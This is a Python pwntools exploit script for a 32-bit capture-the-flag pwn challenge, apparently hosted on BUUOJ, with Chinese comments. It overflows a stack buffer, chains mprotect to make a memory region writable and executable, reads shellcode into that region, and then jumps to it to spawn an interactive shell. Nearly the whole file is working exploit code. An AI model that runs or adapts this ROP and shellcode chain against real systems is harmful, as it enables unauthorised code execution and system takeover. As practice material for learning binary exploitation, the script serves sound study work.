from pwn import * 
from pwn import p32


debug = 0
gdb_is = 1
context(arch='i386',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,25977)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x080489DE')
    # gdb.attach(r)
    pause()
    pass


getflag_addr = 0x80489a0
exit_addr  = 0x804e660
write_addr = 0x806e270
flag_data = 0x80ECA2D
pop_3 = 0x0806fcc8
printf_addr = 0x80489EA
# libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')
# payload = b'A'*0x2D + p32(getflag_addr) + p32(printf_addr)+ p32(flag_data)+p32(exit_addr)


argu1 = 0x80EB000 #为mprotect函数的第一个参数 (被修改内存的地址) 设置为  
argu2 = 0x1000 #为mprotect函数的第二个参数 (被修改内存的大小) 设置为(0x1000通过程序启动时查看该内存块的大小的到的)
argu3 = 7   #为mprotect函数的第三个参数 (被修改内存的权限) 设置为 (rwx)

pop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; ret
payload = 0x2D * b'a' + p32(elf.sym['mprotect'])
payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop
payload += p32(argu1) + p32(argu2) + p32(argu3)
# 紧接着返回地址为 read对修改的目标地址写入shellcode
payload += p32(elf.sym['read']) 
payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址
payload += p32(0) + p32(argu1) + p32(0x100)
# read写完后 写入执行的目标地址
payload += p32(argu1)
# 先进行sendline执行到read等待输入
r.sendline(payload)
# 继续sendline发送shellcode
r.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))

r.interactive()
